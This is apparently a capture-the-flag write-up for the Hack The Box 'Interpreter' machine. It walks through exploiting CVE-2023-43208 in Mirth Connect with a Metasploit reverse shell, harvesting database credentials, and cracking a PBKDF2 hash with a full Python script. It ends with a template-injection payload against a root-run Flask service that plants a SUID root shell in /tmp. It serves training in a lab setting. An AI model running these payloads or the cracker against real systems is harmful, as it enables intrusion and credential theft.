# HTB Interpreter - Penetration Test Writeup

## Initial Setup

Connect to vpn 
Start the Machine 

## Reconnaissance

### Nmap Scan

Lets start with nmap 

```
sudo nmap -sC -sV 10.129.1.173 -Pn
[sudo] password for weed:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-22 08:24 IST
Stats: 0:00:39 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 08:25 (0:00:40 remaining)
Nmap scan report for 10.129.1.173
Host is up (1.2s latency).
Not shown: 997 closed tcp ports (reset)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
| 256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
|_ 256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp open http
|*http-title: Mirth Connect Administrator
| http-methods:
|* Potentially risky methods: TRACE
| fingerprint-strings:
| FourOhFourRequest:
| HTTP/1.1 404 Not Found
| Cache-Control: must-revalidate,no-cache,no-store
| Content-Type: text/html;charset=iso-8859-1
| Content-Length: 458
| <html>
| <head>
| <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
| <title>Error 404 Not Found</title>
| </head>
| <body><h2>HTTP ERROR 404 Not Found</h2>
| <table>
| <tr><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity.txt%2ebak</td></tr>
| <tr><th>STATUS:</th><td>404</td></tr>
| <tr><th>MESSAGE:</th><td>Not Found</td></tr>
| <tr><th>SERVLET:</th><td>org.eclipse.jetty.servlet.ServletHandler$Default404Servlet-59adcbd2</td></tr>
| </table>
| </body>
| </html>
| GetRequest:
| HTTP/1.1 200 OK
| Date: Sun, 22 Feb 2026 02:54:54 GMT
| Last-Modified: Tue, 18 Jul 2023 17:46:18 GMT
| Content-Type: text/html
| Accept-Ranges: bytes
| Content-Length: 2532
| <!doctype html>
| <html>
| <head>
| <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
| <meta http-equiv="x-ua-compatible" content="IE=edge">
| <meta http-equiv="cache-control" content="no-cache">
| <meta http-equiv="cache-control" content="no-store">
| <title>Mirth Connect Administrator</title>
| <link rel="shortcut icon" type="image/x-icon" href="images/NG_MC_Icon_16x16.png" />
| <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />
| <link rel="stylesheet" type="text/css" href="css/main.css" />
| <script type="text/javascript">
| Break out of frame if inside a frame. */
| (window != window.top) {
| window.top.location = window.location;
| </script>
| <script type="text/javascript" sr
| HTTPOptions:
| HTTP/1.1 200 OK
| Date: Sun, 22 Feb 2026 02:54:55 GMT
| Allow: GET, HEAD, TRACE, OPTIONS
| RTSPRequest:
| HTTP/1.1 505 Unknown Version
| Content-Type: text/html;charset=iso-8859-1
| Content-Length: 58
| Connection: close
| <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
| X11Probe:
| HTTP/1.1 400 Illegal character CNTL=0x0
| Content-Type: text/html;charset=iso-8859-1
| Content-Length: 69
| Connection: close
|_ <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
443/tcp open ssl/https
| http-methods:
|_ Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
|*Not valid after: 2075-09-19T12:50:05
| fingerprint-strings:
| FourOhFourRequest:
| HTTP/1.1 404 Not Found
| Cache-Control: must-revalidate,no-cache,no-store
| Content-Type: text/html;charset=iso-8859-1
| Content-Length: 458
| <html>
| <head>
| <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
| <title>Error 404 Not Found</title>
| </head>
| <body><h2>HTTP ERROR 404 Not Found</h2>
| <table>
| <tr><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity.txt%2ebak</td></tr>
| <tr><th>STATUS:</th><td>404</td></tr>
| <tr><th>MESSAGE:</th><td>Not Found</td></tr>
| <tr><th>SERVLET:</th><td>org.eclipse.jetty.servlet.ServletHandler$Default404Servlet-59adcbd2</td></tr>
| </table>
| </body>
| </html>
| GetRequest:
| HTTP/1.1 200 OK
| Date: Sun, 22 Feb 2026 02:55:02 GMT
| Last-Modified: Tue, 18 Jul 2023 17:46:18 GMT
| Content-Type: text/html
| Accept-Ranges: bytes
| Content-Length: 2532
| <!doctype html>
| <html>
| <head>
| <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
| <meta http-equiv="x-ua-compatible" content="IE=edge">
| <meta http-equiv="cache-control" content="no-cache">
| <meta http-equiv="cache-control" content="no-store">
| <title>Mirth Connect Administrator</title>
| <link rel="shortcut icon" type="image/x-icon" href="images/NG_MC_Icon_16x16.png" />
| <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />
| <link rel="stylesheet" type="text/css" href="css/main.css" />
| <script type="text/javascript">
| Break out of frame if inside a frame. */
| (window != window.top) {
| window.top.location = window.location;
| </script>
| <script type="text/javascript" sr
| HTTPOptions:
| HTTP/1.1 200 OK
| Date: Sun, 22 Feb 2026 02:55:04 GMT
|* Allow: GET, HEAD, TRACE, OPTIONS
|_ssl-date: TLS randomness does not represent time
|_http-title: Mirth Connect Administrator
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=2/22%Time=699A6FFE%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,A8F,"HTTP/1.1\x20200\x20OK\r\nDate:\x20Sun,\x2022\x20Feb\x20
SF:2026\x2002:54:54\x20GMT\r\nLast-Modified:\x20Tue,\x2018\x20Jul\x202023
SF:x2017:46:18\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20b
SF:ytes\r\nContent-Length:\x202532\r\n\r\n<!doctype\x20html>\n<html>\n<hea
SF:d>\n\t<meta\x20http-equiv="Content-Type"\x20content="text/html;\x20c
SF:harset=UTF-8">\n\t<meta\x20http-equiv="x-ua-compatible"\x20content=
SF:"IE=edge">\n\t<meta\x20http-equiv="cache-control"\x20content="no-ca
SF:che">\n\t<meta\x20http-equiv="cache-control"\x20content="no-store"
SF:>\n\t\n\t<title>Mirth\x20Connect\x20Administrator</title>\n\t\n\t<link
SF:x20rel="shortcut\x20icon"\x20type="image/x-icon"\x20href="images/N
SF:G_MC_Icon_16x16.png"\x20/>\n\t<link\x20rel="stylesheet"\x20type="t
SF:ext/css"\x20href="css/bootstrap.css"\x20/>\n\t<link\x20rel="styles
SF:heet"\x20type="text/css"\x20href="css/main.css"\x20/>\n\t\n\t<scr
SF:ipt\x20type="text/javascript">\n\t\t/*\x20Break\x20out\x20of\x20fram
SF:e\x20if\x20inside\x20a\x20frame.\x20*/\n\t\tif\x20$  window\x20!=\x20w
SF:indow\.top  $\x20{\n\t\t\twindow.top.location\x20=\x20window.location
SF:;\n\t\t}\n\t</script>\n\n\t<script\x20type="text/javascript"\x20sr")%
SF:r(HTTPOptions,5A,"HTTP/1.1\x20200\x20OK\r\nDate:\x20Sun,\x2022\x20Feb
SF:x202026\x2002:54:55\x20GMT\r\nAllow:\x20GET,\x20HEAD,\x20TRACE,\x20OPTI
SF:ONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1.1\x20505\x20Unknown\x20Version
SF:r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x20
SF:58\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20505</h1><pre>re
SF:ason:\x20Unknown\x20Version</pre>")%r(X11Probe,C3,"HTTP/1.1\x20400\x20
SF:Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=
SF:iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>
SF:Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=
SF:0x0</pre>")%r(FourOhFourRequest,257,"HTTP/1.1\x20404\x20Not\x20Found\r
SF:\nCache-Control:\x20must-revalidate,no-cache,no-store\r\nContent-Type:
SF:x20text/html;charset=iso-8859-1\r\nContent-Length:\x20458\r\n\r\n<html>
SF:\n<head>\n<meta\x20http-equiv="Content-Type"\x20content="text/html;c
SF:harset=ISO-8859-1"/>\n<title>Error\x20404\x20Not\x20Found</title>\n</h
SF:ead>\n<body><h2>HTTP\x20ERROR\x20404\x20Not\x20Found</h2>\n<table>\n<tr
SF:><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity.txt%2ebak</td></tr>\n<tr>
SF:<th>STATUS:</th><td>404</td></tr>\n<tr><th>MESSAGE:</th><td>Not\x20Foun
SF:d</td></tr>\n<tr><th>SERVLET:</th><td>org.eclipse.jetty.servlet.Ser
SF:vletHandler$Default404Servlet-59adcbd2</td></tr>\n</table>\n\n</body>
SF:n</html>\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port443-TCP:V=7.94SVN%T=SSL%I=7%D=2/22%Time=699A7006%P=x86_64-pc-linux-
SF:gnu%r(GetRequest,A8F,"HTTP/1.1\x20200\x20OK\r\nDate:\x20Sun,\x2022\x20
SF:Feb\x202026\x2002:55:02\x20GMT\r\nLast-Modified:\x20Tue,\x2018\x20Jul\x
SF:202023\x2017:46:18\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Range
SF:s:\x20bytes\r\nContent-Length:\x202532\r\n\r\n<!doctype\x20html>\n<html
SF:>\n<head>\n\t<meta\x20http-equiv="Content-Type"\x20content="text/htm
SF:l;\x20charset=UTF-8">\n\t<meta\x20http-equiv="x-ua-compatible"\x20co
SF:ntent="IE=edge">\n\t<meta\x20http-equiv="cache-control"\x20content=
SF:"no-cache">\n\t<meta\x20http-equiv="cache-control"\x20content="no-
SF:store">\n\t\n\t<title>Mirth\x20Connect\x20Administrator</title>\n\t\n
SF:t<link\x20rel="shortcut\x20icon"\x20type="image/x-icon"\x20href="i
SF:mages/NG_MC_Icon_16x16.png"\x20/>\n\t<link\x20rel="stylesheet"\x20t
SF:ype="text/css"\x20href="css/bootstrap.css"\x20/>\n\t<link\x20rel=
SF:"stylesheet"\x20type="text/css"\x20href="css/main.css"\x20/>\n\t
SF:n\t<script\x20type="text/javascript">\n\t\t/*\x20Break\x20out\x20of
SF:x20frame\x20if\x20inside\x20a\x20frame.\x20*/\n\t\tif\x20$  window\x20
SF:!=\x20window\.top  $\x20{\n\t\t\twindow.top.location\x20=\x20window.l
SF:ocation;\n\t\t}\n\t</script>\n\n\t<script\x20type="text/javascript"\x
SF:20sr")%r(HTTPOptions,5A,"HTTP/1.1\x20200\x20OK\r\nDate:\x20Sun,\x2022
SF:x20Feb\x202026\x2002:55:04\x20GMT\r\nAllow:\x20GET,\x20HEAD,\x20TRACE,
SF:x20OPTIONS\r\n\r\n")%r(FourOhFourRequest,257,"HTTP/1.1\x20404\x20Not\x
SF:20Found\r\nCache-Control:\x20must-revalidate,no-cache,no-store\r\nConte
SF:nt-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x20458\r\n
SF:r\n<html>\n<head>\n<meta\x20http-equiv="Content-Type"\x20content="te
SF:xt/html;charset=ISO-8859-1"/>\n<title>Error\x20404\x20Not\x20Found</ti
SF:tle>\n</head>\n<body><h2>HTTP\x20ERROR\x20404\x20Not\x20Found</h2>\n<ta
SF:ble>\n<tr><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity.txt%2ebak</td></
SF:tr>\n<tr><th>STATUS:</th><td>404</td></tr>\n<tr><th>MESSAGE:</th><td>No
SF:t\x20Found</td></tr>\n<tr><th>SERVLET:</th><td>org.eclipse.jetty.ser
SF:vlet.ServletHandler$Default404Servlet-59adcbd2</td></tr>\n</table>\n
SF:n</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.89 seconds
```

### Host Configuration

```
echo "machine-ip interpreter.htb" | sudo tee /etc/hosts > /dev/null
```

We found a web page with © 2021 NextGen Healthcare | Mirth Connect

## Vulnerability Analysis

### CVE-2023-43208 Discovery

Found out a vuln CVE-2023-43208 - Mirth Connect Remote Code Execution (RCE) Exploit 🚨

This CVE contains a critical vulnerability in NextGen Healthcare Mirth Connect versions prior to 4.4.1. The vulnerability, tracked as CVE-2023-43208, allows for unauthenticated remote code execution (RCE) on systems running the vulnerable software versions.

Mirth Connect, an open-source healthcare integration engine, failed to properly handle deserialized data, making it susceptible to arbitrary OS command execution through specially crafted HTTP requests. The vulnerability was discovered following an incomplete patch for CVE-2023-37679, initially addressed by IHTeam. Subsequent research by Horizon3.ai revealed a bypass to the deny list implemented in the original patch, leading to the identification of CVE-2023-43208. This exploit module has been successfully tested against Mirth Connect versions 4.1.1, 4.3.0, and 4.4.0.

## Exploitation

### Metasploit Setup

Lets use metasploit to get a shell

```
msfconsole -q
```

Make sure the 4444 listener is not open by using 

```
sudo fuser -k 4444/tcp
```

### Configuration

```
set RHOSTS interpreter.htb
set RPORT 443
set SSL true
set LHOST 10.10.16.52
set LPORT 4444
```

### Shell Upgrade

To upgrade a shell 

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

You will see something like this

```
mirth@interpreter:$ 
```

## Database Enumeration

### Database Discovery

Now look for database..

```
find / -name "*.db" -o -name "*.sqlite" 2>/dev/null
/etc/alternatives/regulatory.db
/usr/sbin/tcptraceroute.db
/usr/lib/firmware/regulatory.db
/usr/lib/python3/dist-packages/fail2ban/tests/files/database_v1.db
/usr/lib/python3/dist-packages/fail2ban/tests/files/database_v2.db
/usr/lib/x86_64-linux-gnu/avahi/service-types.db
/usr/bin/traceroute.db
/usr/bin/traceroute6.db
/usr/bin/lft.db
/usr/bin/traceproto.db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/var/cache/dictionaries-common/aspell.db
/var/lib/dpkg/alternatives/regulatory.db
```

### Connection Configuration

Check connection Configuration

```
cat /usr/local/mirthconnect/conf/mirth.properties

# Mirth Connect configuration file

# directories
dir.appdata = /var/lib/mirthconnect
dir.tempdata = ${dir.appdata}/temp

# ports
http.port = 80
https.port = 443

# password requirements
password.minlength = 0
password.minupper = 0
password.minlower = 0
password.minnumeric = 0
password.minspecial = 0
password.retrylimit = 0
password.lockoutperiod = 0
password.expiration = 0
password.graceperiod = 0
password.reuseperiod = 0
password.reuselimit = 0

# Only used for migration purposes, do not modify
version = 4.4.0

# keystore
keystore.path = ${dir.appdata}/keystore.jks
keystore.storepass = 5GbU5HGTOOgE
keystore.keypass = tAuJfQeXdnPw
keystore.type = JCEKS

# server
http.contextpath = /
server.url =

http.host = 0.0.0.0
https.host = 0.0.0.0

https.client.protocols = TLSv1.3,TLSv1.2
https.server.protocols = TLSv1.3,TLSv1.2,SSLv2Hello
https.ciphersuites = TLS_CHACHA20_POLY1305_SHA256,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256,TLS_AES_256_GCM_SHA384,TLS_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384,TLS_DHE_RSA_WITH_AES_256_GCM_SHA384,TLS_DHE_DSS_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256,TLS_DHE_RSA_WITH_AES_128_GCM_SHA256,TLS_DHE_DSS_WITH_AES_128_GCM_SHA256,TLS_EMPTY_RENEGOTIATION_INFO_SCSV
https.ephemeraldhkeysize = 2048

# If set to true, the Connect REST API will require all incoming requests to contain an "X-Requested-With" header.
# This protects against Cross-Site Request Forgery (CSRF) security vulnerabilities.
server.api.require-requested-with = true

# CORS headers
server.api.accesscontrolalloworigin = *
server.api.accesscontrolallowcredentials = false
server.api.accesscontrolallowmethods = GET, POST, DELETE, PUT
server.api.accesscontrolallowheaders = Content-Type
server.api.accesscontrolexposeheaders =
server.api.accesscontrolmaxage =

# Determines whether or not channels are deployed on server startup.
server.startupdeploy = true

# Determines whether libraries in the custom-lib directory will be included on the server classpath.
# To reduce potential classpath conflicts you should create Resources and use them on specific channels/connectors instead, and then set this value to false.
server.includecustomlib = true

# administrator
administrator.maxheapsize = 512m

# properties file that will store the configuration map and be loaded during server startup
configurationmap.path = ${dir.appdata}/configuration.properties

# The language version for the Rhino JavaScript engine (supported values: 1.0, 1.1, ..., 1.8, es6).
rhino.languageversion = es6

# options: derby, mysql, postgres, oracle, sqlserver
database = mysql

# examples:
#   Derby                       jdbc:derby:${dir.appdata}/mirthdb;create=true
#   PostgreSQL                  jdbc:postgresql://localhost:5432/mirthdb
#   MySQL                       jdbc:mysql://localhost:3306/mirthdb
#   Oracle                      jdbc:oracle:thin:@localhost:1521:DB
#   SQL Server/Sybase (jTDS)    jdbc:jtds:sqlserver://localhost:1433/mirthdb
#   Microsoft SQL Server        jdbc:sqlserver://localhost:1433;databaseName=mirthdb
#   If you are using the Microsoft SQL Server driver, please also specify database.driver below 
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod

# If using a custom or non-default driver, specify it here.
# example:
# Microsoft SQL server: database.driver = com.microsoft.sqlserver.jdbc.SQLServerDriver
# (Note: the jTDS driver is used by default for sqlserver)
database.driver = org.mariadb.jdbc.Driver

# Maximum number of connections allowed for the main read/write connection pool
database.max-connections = 20
# Maximum number of connections allowed for the read-only connection pool
database-readonly.max-connections = 20

# database credentials
database.username = mirthdb
database.password = MirthPass123!

#On startup, Maximum number of retries to establish database connections in case of failure
database.connection.maxretry = 2

#On startup, Maximum wait time in milliseconds for retry to establish database connections in case of failure
database.connection.retrywaitinmilliseconds = 10000

# If true, various read-only statements are separated into their own connection pool.
# By default the read-only pool will use the same connection information as the master pool,
# but you can change this with the "database-readonly" options. For example, to point the
# read-only pool to a different JDBC URL:
#
# database-readonly.url = jdbc:...
# 
database.enable-read-write-split = true
```

### Database Credentials Found

We got username and password for database:

- **Username:** mirthdb
- **Password:** MirthPass123!
- **Database:** mc_bdd_prod on localhost:3306

### User Enumeration

We found a person named as SEDRIC

```
mysql -u mirthdb -pMirthPass123! -D mc_bdd_prod -e "SELECT * FROM PERSON;"

| ID | USERNAME | FIRSTNAME | LASTNAME | ORGANIZATION | INDUSTRY | EMAIL | PHONENUMBER | DESCRIPTION | LAST_LOGIN          | GRACE_PERIOD_START | STRIKE_COUNT | LAST_STRIKE_TIME | LOGGED_IN | ROLE | COUNTRY       | STATETERRITORY | USERCONSENT |
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+
|  2 | sedric   |           |          |              | NULL     |       |             |             | 2025-09-21 17:56:02 | NULL               |            0 | NULL             |           | NULL | United States | NULL           |           0 |
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+
```

### Password Hash Discovery

Also we Found a person password table where we got Base64-encoded password hash

```
mysql -u mirthdb -pMirthPass123! -D mc_bdd_prod -e "SELECT * FROM PERSON_PASSWORD;"
+-----------+----------------------------------------------------------+---------------------+
| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |
+-----------+----------------------------------------------------------+---------------------+
|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== | 2025-09-19 09:22:28 |
+-----------+----------------------------------------------------------+---------------------+
```

## Hash Cracking

### Cryptographic Analysis: Cracking PBKDF2-HMAC-SHA256

Mirth Connect 4.4.0 uses a highly secure hashing scheme: PBKDF2-HMAC-SHA256. Unlike standard MD5 or SHA1, PBKDF2 is "stretched" to prevent brute-force attacks.

### Understanding the Hash Structure

The 40-byte hash extracted from the database is a concatenation of:

- **Salt (8 bytes):** Used to prevent rainbow table attacks.
- **Derived Key (32 bytes):** The actual hashed output.

The iteration count is a staggering 600,000. This means for every single password guess, the computer must perform 600,000 SHA-256 operations.

### Python Script for Hash Cracking

Here's a Python script to crack the PBKDF2-HMAC-SHA256 hash:

```python
#!/usr/bin/env python3
"""
PBKDF2-HMAC-SHA256 Hash Cracker for Mirth Connect 4.4.0
Hash format: 8-byte salt + 32-byte derived key (40 bytes total)
Iterations: 600,000
"""

import hashlib
import binascii
from tqdm import tqdm
import argparse

def crack_pbkdf2_hash(hash_hex, wordlist_path, iterations=600000):
    """
    Crack PBKDF2-HMAC-SHA256 hash
    
    Args:
        hash_hex: Hexadecimal string of the hash (40 bytes = 80 chars)
        wordlist_path: Path to wordlist file
        iterations: Number of PBKDF2 iterations (default: 600000)
    """
    
    # Extract salt (first 8 bytes = 16 chars) and derived key (next 32 bytes = 64 chars)
    if len(hash_hex) != 80:
        print(f"Error: Hash should be 80 hex characters, got {len(hash_hex)}")
        return None
    
    salt_hex = hash_hex[:16]  # First 8 bytes
    key_hex = hash_hex[16:]    # Next 32 bytes
    
    salt = binascii.unhexlify(salt_hex)
    target_key = binascii.unhexlify(key_hex)
    
    print(f"[+] Salt (hex): {salt_hex}")
    print(f"[+] Target Key (hex): {key_hex}")
    print(f"[+] Iterations: {iterations}")
    print(f"[+] Loading wordlist: {wordlist_path}")
    
    try:
        with open(wordlist_path, 'r', encoding='latin-1') as f:
            passwords = f.readlines()
    except FileNotFoundError:
        print(f"[-] Wordlist not found: {wordlist_path}")
        return None
    
    print(f"[+] Trying {len(passwords)} passwords...")
    
    for password in tqdm(passwords, desc="Cracking"):
        password = password.strip()
        if not password:
            continue
        
        # Compute PBKDF2-HMAC-SHA256
        derived_key = hashlib.pbkdf2_hmac(
            'sha256', 
            password.encode('utf-8'), 
            salt, 
            iterations
        )
        
        if derived_key == target_key:
            print(f"\n[+] Password found: {password}")
            return password
    
    print("\n[-] Password not found in wordlist")
    return None

def generate_hash(password, salt_hex=None, iterations=600000):
    """
    Generate PBKDF2-HMAC-SHA256 hash for testing
    
    Args:
        password: Password to hash
        salt_hex: Optional salt in hex (if None, random salt generated)
        iterations: Number of iterations
    
    Returns:
        Hex string of salt + derived key (80 chars)
    """
    import os
    
    if salt_hex is None:
        salt = os.urandom(8)
    else:
        salt = binascii.unhexlify(salt_hex)
    
    derived_key = hashlib.pbkdf2_hmac(
        'sha256', 
        password.encode('utf-8'), 
        salt, 
        iterations
    )
    
    result = binascii.hexlify(salt + derived_key).decode()
    return result

def main():
    parser = argparse.ArgumentParser(description='Crack PBKDF2-HMAC-SHA256 hash from Mirth Connect')
    parser.add_argument('hash', help='Hash in hex format (80 characters)')
    parser.add_argument('-w', '--wordlist', default='/usr/share/wordlists/rockyou.txt',
                        help='Path to wordlist (default: /usr/share/wordlists/rockyou.txt)')
    parser.add_argument('-i', '--iterations', type=int, default=600000,
                        help='PBKDF2 iterations (default: 600000)')
    parser.add_argument('-g', '--generate', metavar='PASSWORD',
                        help='Generate hash for a password (for testing)')
    
    args = parser.parse_args()
    
    if args.generate:
        # Generate mode
        result = generate_hash(args.generate, iterations=args.iterations)
        print(f"[+] Generated hash for '{args.generate}':")
        print(result)
        print(f"\nSalt (first 16 chars): {result[:16]}")
        print(f"Key (next 64 chars): {result[16:]}")
        return
    
    # Crack mode
    password = crack_pbkdf2_hash(args.hash, args.wordlist, args.iterations)
    
    if password:
        print(f"\n[!] SUCCESS! Password: {password}")
        print(f"[!] Use this to SSH: ssh sedric@interpreter.htb")
    else:
        print("\n[!] Failed to crack the hash")

if __name__ == "__main__":
    main()
```

### Running the Cracker

```
nano pass.py
chmod +x pass.py 
pip3 install tqdm --break-system-packages

python3 pass.py $HASH -w /path/to/rockyou.txt
```

### Password Discovery

The Password is **"snowflake1"**

## User Access

### SSH Login

Lets ssh

```
ssh sedric@10.129.2.160

The authenticity of host '10.129.2.160 (10.129.2.160)' can't be established.
ED25519 key fingerprint is SHA256:Oz7Fk6YvrB8/5uSyuoY+mqLefkwpPaepkXAppxIX0xk.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:18: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.2.160' (ED25519) to the list of known hosts.
sedric@10.129.2.160's password: 
Linux interpreter 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Feb 22 13:07:56 2026 from 10.10.16.52

sedric@interpreter:~$ ls
user.txt
sedric@interpreter:~$ cat user.txt
e3c674d7......................
```

## Privilege Escalation

### Finding Vulnerable Python Script

Initially at msfconsole we found a python file that was not accessible

```
mirth@interpreter:/usr/local/mirthconnect$ ls -la /usr/local/bin/
ls -la /usr/local/bin/
total 12
drwxr-xr-x  2 root root   4096 Feb 16 15:42 .
drwxr-xr-x 11 root root   4096 Feb 16 15:42 ..
-rwxr-----  1 root sedric 2332 Sep 19 09:27 notif.py
```

### Script Analysis

We tried to access the file here 

```
sedric@interpreter:~$ cd /usr/local/bin/
sedric@interpreter:/usr/local/bin$ ls
notif.py
sedric@interpreter:/usr/local/bin$ cat notif.py
#!/usr/bin/env python3
"""
Notification server for added patients.
This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.
It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.
It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.
"""
from flask import Flask, request, abort
import re
import uuid
from datetime import datetime
import xml.etree.ElementTree as ET, os

app = Flask(__name__)
USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # DOB format is DD/MM/YYYY
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    try:
        xml_text = request.data.decode()
        xml_root = ET.fromstring(xml_text)
    except ET.ParseError:
        return "XML ERROR\n", 400
    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
    if patient is None:
        return "No <patient> tag found\n", 400
    id = uuid.uuid4().hex
    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
    path = os.path.join(USER_DIR,f"{id}.txt")
    with open(path,"w") as f:
        f.write(notification+"\n")
    return notification

if __name__=="__main__":
    app.run("127.0.0.1",54321, threaded=True)
```

### Vulnerability: Server-Side Template Injection

Vulnerability: Server-Side Template Injection via eval(f"f'''{template}'''")

The working payload uses {...} injection inside a field with base64 to bypass the space restriction.

### Encoding the Command

```
sedric@interpreter:/usr/local/bin$ echo -n 'install -o root -m 4755 /bin/bash /tmp/.sh' | base64
aW5zdGFsbCAtbyByb290IC1tIDQ3NTUgL2Jpbi9iYXNoIC90bXAvLnNo
```

### Python Script for Exploitation

A python script was built that avoids shell escaping issues

```python
python3 << 'EOF'
import urllib.request
b64cmd = "aW5zdGFsbCAtbyByb290IC1tIDQ3NTUgL2Jpbi9iYXNoIC90bXAvLnNo"
payload = '{__import__("os").popen(__import__("base64").b64decode("' + b64cmd + '").decode()).read()}'
xml = f"""<?xml version='1.0'?>
<patient>
<firstname>test</firstname>
<lastname>test</lastname>
<sender_app>{payload}</sender_app>
<timestamp>12/12/2024</timestamp>
<birth_date>01/01/1990</birth_date>
<gender>M</gender>
</patient>""".encode()
req = urllib.request.Request('http://127.0.0.1:54321/addPatient', data=xml, headers={'Content-Type':'application/xml'})
print(urllib.request.urlopen(req).read().decode())
EOF
```

### Exploitation Result

We received a reply

```
Patient test test (M), 36 years old, received from  at 12/12/2024
```

### Verification

Lets confirm it exists with SUID

```
sedric@interpreter:/usr/local/bin$ ls -la /tmp/.sh 
-rwsr-xr-x 1 root root 1265648 Feb 22 13:16 /tmp/.sh
```

### Root Shell Access

To get root shell

```
/tmp/.sh -p

.sh-5.2# cat /root/root.txt
744faba85be2..................
```

## Summary

The HTB Interpreter challenge was successfully compromised through a multi-stage attack:

1. **Initial Access:** Exploited CVE-2023-43208 in Mirth Connect 4.4.0 for unauthenticated RCE
2. **Credential Extraction:** Retrieved database credentials from configuration files
3. **Hash Cracking:** Cracked PBKDF2-HMAC-SHA256 hashed password using wordlist attack
